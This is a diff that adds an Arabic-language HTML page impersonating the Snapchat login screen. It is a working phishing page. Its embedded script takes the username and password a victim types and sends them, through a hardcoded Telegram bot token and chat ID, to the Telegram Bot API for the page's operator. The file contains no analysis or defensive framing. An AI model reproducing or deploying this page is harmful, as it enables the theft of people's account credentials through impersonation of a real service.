@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>تسجيل الدخول – سناب شات</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  :root{
+    --bg:#fff;
+    --primary:#FFFC00;          /* لون زر سناب شات */
+    --primary-hover:#e6e600;
+    --border:#e6e6e6;
+    --text:#333;
+    --placeholder:#a6a6a6;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:var(--bg);}
+  .wrapper{max-width:360px;margin:auto;padding:20px;}
+  .input{margin-bottom:15px;}
+  .input input{
+    width:100%;padding:12px 10px;border:1px solid var(--border);
+    border-radius:4px;font-size:14px;color:var(--text);
+  }
+  .input input::placeholder{color:var(--placeholder);}
+  .btn{
+    width:100%;padding:12px;background:var(--primary);
+    color:#333;border:none;border-radius:4px;
+    font-weight:bold;cursor:pointer;transition:background .2s;
+  }
+  .btn:hover{background:var(--primary-hover);}
+  .forgot{text-align:right;margin:10px 0;}
+  .forgot a{color:var(--primary);text-decoration:none;}
+  .forgot a:hover{color:var(--primary-hover);}
+  .signup{
+    text-align:center;margin-top:20px;
+    font-size:13px;color:var(--text);
+  }
+  .signup a{color:var(--primary);text-decoration:none;}
+  .signup a:hover{color:var(--primary-hover);}
+</style>
+</head>
+<body>
+<div class="wrapper">
+  <form id="loginForm">
+    <div class="input">
+      <input type="text" id="username" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
+    </div>
+    <div class="input">
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+    </div>
+    <div class="input">
+      <input type="number" id="followers" placeholder="عدد المتابعين (اختياري)" min="0">
+    </div>
+    <button type="submit" class="btn">تسجيل الدخول</button>
+  </form>
+
+  <div class="forgot">
+    <a href="#">نسيت كلمة المرور؟</a>
+  </div>
+
+  <div class="signup">
+    لا تملك حسابًا؟ <a href="#">أنشئ حسابًا جديدًا</a>
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = '8635912264:AAGu4XL8v9WuS90vwrBGyJGz5fWyFMstM2E';
+  const CHAT_ID   = '8246832284';
+
+  document.getElementById('loginForm').addEventListener('submit', async e=>{
+    e.preventDefault();
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value.trim();
+    const foll = document.getElementById('followers').value.trim();
+
+    const msg = `📲 تسجيل دخول سناب شات\n👤 اسم المستخدم: ${user}\n🔑 كلمة المرور: ${pass}\n👥 المتابعين: ${foll||'لا يوجد'}`;
+
+    try{
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+      });
+      if(!res.ok) throw new Error('Telegram API error');
+      alert('تم إرسال بيانات تسجيل الدخول إلى البوت ✔️');
+      e.target.reset();
+    }catch(err){
+      console.error(err);
+      alert('فشل الإرسال! حاول مرة أخرى.');
+    }
+  });
+</script>
+</body>
+</html>
